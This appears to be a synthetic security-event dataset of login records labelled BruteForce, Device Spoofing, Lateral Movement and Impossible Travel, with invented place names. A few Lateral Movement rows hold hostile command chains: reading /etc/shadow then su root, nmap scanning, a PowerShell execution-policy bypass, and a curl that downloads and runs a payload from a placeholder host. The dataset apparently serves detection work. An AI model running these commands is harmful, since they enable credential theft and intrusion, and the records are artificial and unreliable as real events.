+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:07,68.74.121.87,"Woodwardshire, Martinique",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:09,68.74.121.87,"Dawnhaven, Anguilla",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:11,68.74.121.87,"Floresport, Micronesia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:14,68.74.121.87,"Wongview, Saint Kitts and Nevis",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:17,68.74.121.87,"East Lindsayland, Ukraine",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:21,68.74.121.87,"East Christinaport, Venezuela",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:21,68.74.121.87,"Davisside, Egypt",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:22,68.74.121.87,"Garymouth, Solomon Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:25,68.74.121.87,"Jamesside, Austria",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:25,68.74.121.87,"North Tiffany, Algeria",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:27,68.74.121.87,"Jessicaton, Heard Island and McDonald Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:30,68.74.121.87,"Jamesbury, Cameroon",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:31,68.74.121.87,"Oliverburgh, Cook Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:32,68.74.121.87,"North Erin, Australia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:34,68.74.121.87,"Schneidertown, Bangladesh",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:35,68.74.121.87,"Leeport, Tanzania",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:40,68.74.121.87,"West Holly, Latvia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:44,68.74.121.87,"South Robertland, Marshall Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:47,68.74.121.87,"Elizabethview, Guernsey",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:50,68.74.121.87,"Port Jenny, Cyprus",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:51,68.74.121.87,"North Jennifer, Czech Republic",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:53,68.74.121.87,"New Patrick, Saint Barthelemy",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:55,68.74.121.87,"Karenview, Northern Mariana Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:02,68.74.121.87,"Shepherdmouth, Suriname",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:13,68.74.121.87,"West Sherry, Netherlands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:15,68.74.121.87,"New Roger, Afghanistan",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:17,68.74.121.87,"Danielchester, Lebanon",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:21,68.74.121.87,"Amandaland, Guinea-Bissau",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:23,68.74.121.87,"East Sarahside, Bangladesh",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:41,68.74.121.87,"Castroport, Antarctica (the territory South of 60 deg S)",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:44,68.74.121.87,"West Vernon, Chad",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:53,68.74.121.87,"South John, Denmark",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:55,68.74.121.87,"South Tashamouth, Rwanda",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:13,68.74.121.87,"South Anneberg, Congo",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:20,68.74.121.87,"South Mercedes, Ukraine",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:25,68.74.121.87,"Roblesbury, Rwanda",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:33,68.74.121.87,"West Maria, Belgium",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:40,68.74.121.87,"North Coreyview, Luxembourg",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:50:00,68.74.121.87,"Millerchester, North Macedonia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ebd78040-c4ca-4c44-897f-7431850907ff,User,2026-06-26 11:30:23,66.35.252.207,"North Dawn, Taiwan",GitLab,Password,529,N/A,BlackArch - Wget - MAC: 5e:5f:28:4d:ce:31,True,Device Spoofing
+8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 11:45:46,178.148.47.186,"West Tracymouth, Somalia",VPN,SSO,5460,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 10 - Chrome,True,Lateral Movement
+8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 11:49:46,178.148.47.186,"West Tracymouth, Somalia",Intranet,SSO,1874,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 10 - Chrome,True,Lateral Movement
+8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 12:00:46,178.148.47.186,"West Tracymouth, Somalia",Domain Controller,SSO,951,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 10 - Chrome,True,Lateral Movement
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:14,46.41.2.27,"Jameschester, Czech Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:18,46.41.2.27,"Lukebury, Oman",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:18,46.41.2.27,"Melissaland, Falkland Islands (Malvinas)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:20,46.41.2.27,"Penningtonmouth, Samoa",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:28,46.41.2.27,"Adkinsside, Myanmar",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:29,46.41.2.27,"New Andrea, Bermuda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:30,46.41.2.27,"West Kathyside, India",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:30,46.41.2.27,"South Ianberg, French Polynesia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:31,46.41.2.27,"Andersonshire, United States of America",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:32,46.41.2.27,"Annaview, Niger",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:34,46.41.2.27,"Samuelshire, Ireland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:39,46.41.2.27,"Aprilfurt, Austria",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:40,46.41.2.27,"Chavezside, Armenia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:44,46.41.2.27,"West Amandaburgh, Ireland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 12:03:46,178.148.47.186,"West Tracymouth, Somalia",Jira,SSO,2866,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,Windows 10 - Chrome,True,Lateral Movement
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:49,46.41.2.27,"South Melvinview, Tunisia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:50,46.41.2.27,"Huertaport, Afghanistan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:54,46.41.2.27,"Marvinfurt, Lithuania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:58,46.41.2.27,"Mariachester, Seychelles",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:00,46.41.2.27,"New Michaelstad, Hungary",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:04,46.41.2.27,"Tammyburgh, Slovenia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:09,46.41.2.27,"Yvonneside, Cameroon",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:11,46.41.2.27,"Port Darryl, Saint Kitts and Nevis",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:14,46.41.2.27,"West Markfort, Saint Helena",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:18,46.41.2.27,"South Kelly, Iceland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:32,46.41.2.27,"East Lee, Liberia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:38,46.41.2.27,"Ayalamouth, Austria",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+0a08ea4e-dd0d-4648-a5c9-3733afbe5e02,User,2026-06-26 12:05:03,58.247.212.114,"Nguyenville, Anguilla",Jira,Hardware Token,1273,N/A,Parrot OS - Curl - MAC: c2:e9:2c:1d:31:c2,True,Device Spoofing
+51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:05:14,46.41.2.27,"Mossberg, Syrian Arab Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51b2cd02-88e6-4f19-bd71-07f0a83881f2,User,2026-06-26 12:07:37,59.128.136.210,"South Jennifer, Greece",Jira,Biometric,6135,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 10 - Chrome,True,Lateral Movement
+51b2cd02-88e6-4f19-bd71-07f0a83881f2,User,2026-06-26 12:10:37,59.128.136.210,"South Jennifer, Greece",Backup Server,Biometric,5140,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Windows 10 - Chrome,True,Lateral Movement
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:09,173.28.145.66,"Ryanstad, Angola",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:12,173.28.145.66,"East Michaelport, South Georgia and the South Sandwich Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:14,173.28.145.66,"Madisonton, Suriname",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:19,173.28.145.66,"Christinefurt, Kyrgyz Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:19,173.28.145.66,"New James, Jamaica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:21,173.28.145.66,"South Stevenmouth, Luxembourg",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:21,173.28.145.66,"Lake Elizabethchester, Netherlands Antilles",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:21,173.28.145.66,"Mendozaview, Indonesia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:27,173.28.145.66,"Boothshire, Cook Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:28,173.28.145.66,"Ericfort, Luxembourg",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:29,173.28.145.66,"South Derekfurt, French Guiana",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:30,173.28.145.66,"Jessicaville, Grenada",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:30,173.28.145.66,"East Jonathanberg, Malta",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:32,173.28.145.66,"Hernandezchester, Gibraltar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:33,173.28.145.66,"West Debra, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:33,173.28.145.66,"Lake Cody, Angola",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:38,173.28.145.66,"Lake Josemouth, Cambodia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:46,173.28.145.66,"Port Curtisberg, Malaysia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 12:17:46,178.148.47.186,"West Tracymouth, Somalia",Backup Server,SSO,4785,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 10 - Chrome,True,Lateral Movement
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:50,173.28.145.66,"Sanchezshire, Costa Rica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:51,173.28.145.66,"South Thomas, Venezuela",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:51,173.28.145.66,"South Jacobville, Timor-Leste",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:52,173.28.145.66,"Jessicamouth, Azerbaijan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:53,173.28.145.66,"New David, Estonia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:53,173.28.145.66,"North Michelle, Nigeria",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:59,173.28.145.66,"Hubbardland, Lesotho",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:00,173.28.145.66,"New Suzanne, Iceland",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:04,173.28.145.66,"Jeffreytown, Ecuador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:11,173.28.145.66,"Taylorshire, Costa Rica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:13,173.28.145.66,"Garciatown, Benin",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:14,173.28.145.66,"Danielsshire, French Polynesia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:21,173.28.145.66,"South Stephenmouth, Guatemala",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:21,173.28.145.66,"West Calvin, Turkmenistan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:21,173.28.145.66,"North Kevinview, Heard Island and McDonald Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:24,173.28.145.66,"Davidshire, Madagascar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:25,173.28.145.66,"Jenniferville, Zambia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:27,173.28.145.66,"Eddieshire, Slovenia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:43,173.28.145.66,"North Jessicaview, Sierra Leone",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:48,173.28.145.66,"East Alison, Cameroon",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:57,173.28.145.66,"Carterburgh, Poland",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:01,173.28.145.66,"Murrayville, Kazakhstan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:09,173.28.145.66,"Scottside, Guam",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:17,173.28.145.66,"South Priscillaborough, Mayotte",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:19,173.28.145.66,"Mcintyreton, Nauru",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:27,173.28.145.66,"New Kevin, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:29,173.28.145.66,"Nelsonton, Bahamas",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:33,173.28.145.66,"Cameronton, Guernsey",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:19:59,173.28.145.66,"Port Michael, Spain",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:20:09,173.28.145.66,"North Sherrifort, Kazakhstan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:20:29,173.28.145.66,"Wilkinsmouth, Saint Lucia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+51b2cd02-88e6-4f19-bd71-07f0a83881f2,User,2026-06-26 12:21:37,59.128.136.210,"South Jennifer, Greece",VPN,Biometric,6406,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 10 - Chrome,True,Lateral Movement
+73174577-8d8f-4077-8f89-aa896da57c42,User,2026-06-26 12:26:19,212.86.117.215,"Port Jenniferview, Afghanistan",Confluence,Password,3498,N/A,Unknown Browser/Device,True,Impossible Travel
